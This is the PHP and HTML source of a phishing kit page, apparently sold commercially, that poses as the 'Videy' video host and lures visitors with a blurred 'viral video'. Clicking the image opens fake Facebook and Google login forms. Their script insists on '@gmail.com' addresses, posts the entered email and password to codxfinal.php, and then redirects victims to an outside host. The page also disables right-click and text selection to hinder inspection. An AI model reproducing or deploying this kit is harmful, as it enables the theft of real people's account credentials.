<?php
// CREATOR KANG SCRIPT
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/62895630150

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE HTML>
<html>
 <head> 
  <meta name="description" content="Videy is a platform for free and simple video hosting."> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
  <title>Video Viral 2025! | Videy - free and simple video hosting</title> 
  <link rel="icon" type="image/x-icon" href="media/favicon.ico"> 
  <link rel="preconnect" href="https://fonts.googleapis.com"> 
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600&amp;family=Poppins:wght@600&amp;display=swap" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/all.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/18/style.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/18/sty2.css"> 
  <style>
</style> 
 </head> 
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> 
  <div class="nav-outer"> 
   <div class="nav-inner"> 
    <div class="logo-text"> 
     <a href="/">videy</a> 
    </div> 
    <a href="/">
     <div class="upload-button-nav">
      Upload
     </div></a> 
    <div class="legal"> 
     <div class="legal-menu"> 
      <a href="javascript:void(0);" class="icon"><i class="fa fa-bars" onclick="LoginAwal()"></i></a> 
     </div> 
     <div class="legal-item"> 
      <a href="/">Privacy Policy</a> 
     </div> 
     <div class="legal-item"> 
      <a href="/">Terms of Service</a> 
     </div> 
     <div class="legal-item"> 
      <a href="/">Abuse</a> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div id="mobile-menu"> 
   <a href="/">Privacy Policy</a> 
   <a href="/">Terms of Service</a> 
   <a href="/">Abuse</a> 
  </div> 
  <div class="body"> 
   <br> 
   <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/18/BlurHitamm.jpg" alt="" onclick="codxLoginPopup()"> 
   <h3>Video Viral 20245!</h3> 
   <br> 
   <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/18/ads.webp" alt="" style="width: 100%; border: none;" onclick="codxLoginPopup()"> 
    </div> 
   </div> 
  </div> 
  <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="select"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" id="FormFB" onsubmit="VerificationData();" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" onsubmit="VerificationData();" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.alex-hosting.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.alex-hosting.my.id/npm/jquery-1.18.min.js"></script>
 <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://images.alex-hosting.my.id/unduh/ai.php";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M https://wa.me/62895316150
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>